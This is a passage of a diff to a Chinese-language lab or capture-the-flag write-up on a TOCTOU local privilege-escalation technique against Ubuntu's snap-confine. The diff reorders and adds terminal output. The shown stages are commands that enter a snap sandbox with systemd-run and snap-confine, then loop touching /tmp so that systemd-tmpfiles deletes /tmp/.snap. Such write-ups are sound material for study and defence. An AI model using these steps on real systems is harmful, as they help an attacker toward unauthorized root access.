@@ -440,8 +440,12 @@ TOCTOU 代表Time-Of-Check to Time-Of-Use（检查时间到使用时间）。它
 #### 比赛安排 
 #### 第一阶段：进入沙盒,要拥有一个/tmp/.snap可供使用的目录，首先需要设置 snap 的沙箱：
 ```
-jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine --base core22 snap.firefox.hook.configure /bin/bash
-...<SNIP>...
+jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) \
+  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
+  --base core22 snap.firefox.hook.configure /bin/bash
+Running as unit: snap.init1776156713.scope; invocation ID: 533040603f9444328c1b81bf9362a8fd
+bash: /home/jonathan/.bashrc: Permission denied
+
 jonathan@snapped:/home/jonathan$ ls /tmp/.snap
 snap  usr
 jonathan@snapped:/home/jonathan$ ls -la /tmp
@@ -456,18 +460,20 @@ drwxr-xr-x  4 root root 4096 Apr 14 04:11 .snap
 #### 第二阶段：等待 systemd-tmpfiles
 #### 策略是保持/tmp沙盒的活力（使其持续存在），同时让其/tmp/.snap逐渐老化：
 ```
-jonathan@snapped:~$ systemd-run --user --scope --unit=snap.init$(date +%s) \
-  env -i SNAP_INSTANCE_NAME=firefox /usr/lib/snapd/snap-confine \
-  --base core22 snap.firefox.hook.configure /bin/bash
-Running as unit: snap.init1776156713.scope; invocation ID: 533040603f9444328c1b81bf9362a8fd
-bash: /home/jonathan/.bashrc: Permission denied
 jonathan@snapped:/home/jonathan$ cd /tmp
-jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done //现在要保持/tmp活跃，同时摒弃.snap陈旧观念
 jonathan@snapped:/tmp$ stat ./.snap
-stat: cannot statx './.snap': No such file or directory
-jonathan@snapped:/tmp$
+  File: ./.snap
+  Size: 4096      	Blocks: 8          IO Block: 4096   directory
+Device: fc00h/64512d	Inode: 261852      Links: 4
+Access: (0755/drwxr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
+Access: 2026-04-14 05:10:27.565032872 -0400
+Modify: 2026-04-14 05:10:27.600032874 -0400
+Change: 2026-04-14 05:10:27.600032874 -0400
+ Birth: 2026-04-14 05:10:27.565032872 -0400
 jonathan@snapped:/tmp$ echo $$
-9674
+
+jonathan@snapped:/tmp$ while test -d ./.snap; do touch ./; sleep 1; done //现在要保持/tmp活跃，同时摒弃.snap陈旧观念
+jonathan@snapped:/tmp$
 
 //保持终端1运行，不要关闭它。
 //在默认的 Ubuntu 24.04 系统上，这需要 30 天时间。但是，可以通过修改脚本，在几分钟内模拟完成此过程。
